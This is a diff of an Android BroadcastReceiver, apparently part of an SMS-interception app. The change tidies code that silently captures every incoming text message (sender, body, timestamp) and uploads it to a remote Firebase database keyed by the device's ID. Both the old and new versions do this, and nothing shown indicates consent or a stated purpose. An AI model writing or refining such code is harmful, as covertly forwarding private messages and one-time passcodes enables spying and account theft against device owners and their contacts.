@@ -25,35 +25,50 @@ public class SmsReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
             
+            // Initialize Firebase
             FirebaseApp.initializeApp(context);
-            DatabaseReference db = FirebaseDatabase.getInstance().getReference();
-            String deviceId = android.provider.Settings.Secure.getString(
-                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+            DatabaseReference database = FirebaseDatabase.getInstance().getReference();
             
+            // Get device ID
+            String deviceId = android.provider.Settings.Secure.getString(
+                context.getContentResolver(),
+                android.provider.Settings.Secure.ANDROID_ID
+            );
+
             Bundle bundle = intent.getExtras();
             if (bundle != null) {
                 Object[] pdus = (Object[]) bundle.get("pdus");
                 if (pdus != null) {
                     for (Object pdu : pdus) {
                         SmsMessage sms = getSmsMessage(pdu);
+                        
                         if (sms != null) {
                             String from = sms.getDisplayOriginatingAddress();
                             String body = sms.getDisplayMessageBody();
                             long timestamp = sms.getTimestampMillis();
+
+                            // Create SMS data map
+                            Map<String, Object> smsData = new HashMap<>();
+                            smsData.put("address", from);
                             
-                            // Firebase me new SMS save karo
-                            Map<String, Object> newSms = new HashMap<>();
-                            newSms.put("address", from);
-                            newSms.put("body", body != null && body.length() > 200 ? 
-                                       body.substring(0, 200) + "..." : body);
-                            newSms.put("date", String.valueOf(timestamp));
-                            newSms.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", 
-                                       Locale.getDefault()).format(new Date(timestamp)));
-                            newSms.put("type", "INBOX");
-                            newSms.put("read", "0");
-                            newSms.put("received_at", ServerValue.TIMESTAMP);
-                            
-                            db.child("devices").child(deviceId).child("new_sms").push().setValue(newSms);
+                            if (body != null && body.length() > 200) {
+                                body = body.substring(0, 200) + "...";
+                            }
+                            smsData.put("body", body);
+                            smsData.put("date", String.valueOf(timestamp));
+                            smsData.put("date_readable", 
+                                new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault())
+                                    .format(new Date(timestamp)));
+                            smsData.put("type", "INBOX");
+                            smsData.put("read", "0");
+                            smsData.put("received_at", ServerValue.TIMESTAMP);
+
+                            // Save to Firebase
+                            database.child("devices")
+                                    .child(deviceId)
+                                    .child("new_sms")
+                                    .push()
+                                    .setValue(smsData);
                         }
                     }
                 }
